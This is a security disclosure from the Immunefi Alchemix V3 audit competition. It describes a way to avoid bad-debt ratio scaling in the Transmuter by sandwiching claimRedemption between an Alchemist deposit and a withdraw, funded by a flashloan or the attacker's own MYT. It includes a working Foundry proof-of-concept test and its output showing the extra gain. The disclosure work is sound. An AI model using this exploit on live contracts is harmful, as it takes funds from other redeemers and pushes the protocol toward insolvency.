# 56555 sc critical user can avoid bad debt ratio scaling when claiming redeem leading to protocol insolvency

**Submitted on Oct 17th 2025 at 15:47:28 UTC by @farismaulana for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #56555
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/Transmuter.sol>
* **Impacts:**
  * Theft of unclaimed yield
  * Protocol insolvency

## Description

## Brief/Intro

This issue stem in how the bad debt is calculated in `Transmuter` contract. in case of global bad debt happen, all redeem claim would get proportional amount of MYT. but user can avoid get the ratio amount and instead claimed full amount like there are no bad debt going on by sandwiching their redeem claim by MYT deposit and withdraw on the `Alchemist` contract, either by user own MYT holding or via flashloan.

## Vulnerability Details

Take a look on how bad debt is calculated on transmuter contract:

```solidity
        uint256 yieldTokenBalance = TokenUtils.safeBalanceOf(alchemist.myt(), address(this));
        // Avoid divide by 0
        uint256 denominator = alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) > 0 ? alchemist.getTotalUnderlyingValue() + alchemist.convertYieldTokensToUnderlying(yieldTokenBalance) : 1;
        uint256 badDebtRatio = alchemist.totalSyntheticsIssued() * 10**TokenUtils.expectDecimals(alchemist.underlyingToken()) / denominator;

        uint256 scaledTransmuted = amountTransmuted;

        if (badDebtRatio > 1e18) {
            scaledTransmuted = amountTransmuted * FIXED_POINT_SCALAR / badDebtRatio;
        }
```

when `badDebtRatio` is higher than 1e18 the custom logic would proportionally scale the transmuted amount.

but if we take a look on how denominator is calculated, it depends on two factor: transmuter holding of MYT and `alchemist.getTotalUnderlyingValue`

it is a bit harder to manipulate the transmuter holding of MYT, instead user can manipulate the `alchemist.getTotalUnderlyingValue`:

```solidity
    function _getTotalUnderlyingValue() internal view returns (uint256 totalUnderlyingValue) {
        uint256 yieldTokenTVLInUnderlying = convertYieldTokensToUnderlying(_mytSharesDeposited);
        totalUnderlyingValue = yieldTokenTVLInUnderlying;
    }
```

this is the root cause, because an user can easily influence how much `_mytSharesDeposited` inside `AlchemistV3` contract via deposit or withdraw.

a malicious user can still get their full redeem amount at current global bad debt condition by atomically sandwich their `claimRedemption` call. more or less the attack path is like this:

1. many users create redemption
2. after sometime, market condition worsened so the protocol is having global bad debt ratio
3. malicious user then call `AlchemistV3::deposit` , `Transmuter::claimRedemption` , `AlchemistV3::withdraw` possibly via flashloan or user own funds to temporarily getting out of the bad debt condition so the `badDebtRatio > 1e18` is false
4. after step 3, the protocol condition worsened, because one user claim amount does not get scaled

## Impact Details

1. malicious user can get more claim amount than intended in case of bad debt condition, it is effectively stealing from another user/making user claim less
2. protocol condition prone to insolvency because some user can avoid the bad debt scaling

## References

<https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/Transmuter.sol#L217-L224> <https://github.com/alchemix-finance/v3-poc/blob/a192ab313c81ba3ab621d9ca1ee000110fbdd1e9/src/AlchemistV3.sol#L1238>

## Proof of Concept

## Proof of Concept

add this to `src/test/AlchemistV3.t.sol` :

```solidity
    function test_inflatingMytDepositedToAvoidBadDebtRatioOnRedeem() external {
        vm.startPrank(someWhale);
        IMockYieldToken(mockStrategyYieldToken).mint(whaleSupply, someWhale);
        vm.stopPrank();

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), depositAmount + 100e18);
        alchemist.deposit(depositAmount, address(0xbeef), 0);
        // a single position nft would have been minted to 0xbeef
        uint256 tokenId = AlchemistNFTHelper.getFirstTokenId(address(0xbeef), address(alchemistNFT));
        alchemist.mint(tokenId, alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization, address(0xbeef));

        uint256 transmuterPreviousBalance = IERC20(address(vault)).balanceOf(address(transmuterLogic));

        // modify yield token price via modifying underlying token supply
        (uint256 prevCollateral, uint256 prevDebt,) = alchemist.getCDP(tokenId);
        // ensure initial debt is correct
        vm.assertApproxEqAbs(prevDebt, 180_000_000_000_000_000_018_000, minimumDepositOrWithdrawalLoss);

        uint256 amountToRedeem = 100_000e18;

        // create redemption
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), amountToRedeem);
        transmuterLogic.createRedemption(amountToRedeem);

        // full mature the redemption
        vm.roll(block.number + (5_256_000) + 1);

        // create global system bad debt scenario
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 12% while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 1200 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        uint256 beefMYTBalanceBefore = vault.balanceOf(address(0xbeef));

        // redeem without manipulating the myt token deposited on alchemist contract
        uint256 snapshotId = vm.snapshot();
        transmuterLogic.claimRedemption(tokenId);
        uint256 beefMYTBalanceAfterHonestRedeem = vault.balanceOf(address(0xbeef));
        uint256 beefMYTHonestRedeemGain = beefMYTBalanceAfterHonestRedeem - beefMYTBalanceBefore;

        console.log("honest redeem", beefMYTHonestRedeemGain);

        // redeem by manipulating the myt token deposited (via flashloan or whale)
        vm.revertTo(snapshotId);
        // first we deal another address with MYT to deposit-withdraw sandwich the claim redemption of 0xbeef
        // we deal to another address so we can simplify the MYT gain calculation of 0xbeef
        uint256 loanAmount = 5_000e18;
        deal(address(vault), address(0xdad), loanAmount);
        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(vault), address(alchemist), loanAmount);
        alchemist.deposit(loanAmount, address(0xdad), 0);
        vm.stopPrank();

        vm.prank(address(0xbeef));
        transmuterLogic.claimRedemption(tokenId);

        // backrun with withdraw from 0xdad
        vm.prank(address(0xdad));
        alchemist.withdraw(loanAmount, address(0xdad), 2);

        uint256 beefMYTBalanceAfterFlashLoanRedeem = vault.balanceOf(address(0xbeef));
        uint256 beefMYTMaliciousRedeemGain = beefMYTBalanceAfterFlashLoanRedeem - beefMYTBalanceBefore;

        console.log("malicious redeem", beefMYTMaliciousRedeemGain);

        assertGt(beefMYTMaliciousRedeemGain, beefMYTHonestRedeemGain);
    }

```

run with `forge test --mt test_inflatingMytDepositedToAvoidBadDebtRatioOnRedeem -vv` :

```bash
[PASS] test_inflatingMytDepositedToAvoidBadDebtRatioOnRedeem() (gas: 4161146)
Logs:
  honest redeem 111000000000000000017760
  malicious redeem 111888000000000000017902

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 18.14ms (6.90ms CPU time)
```

it is shown that by doing the sandwich attack, malicious user can get redeem and get more MYT amount than how it is supposed to. in this specific PoC, it gains 888e18 more than intended.
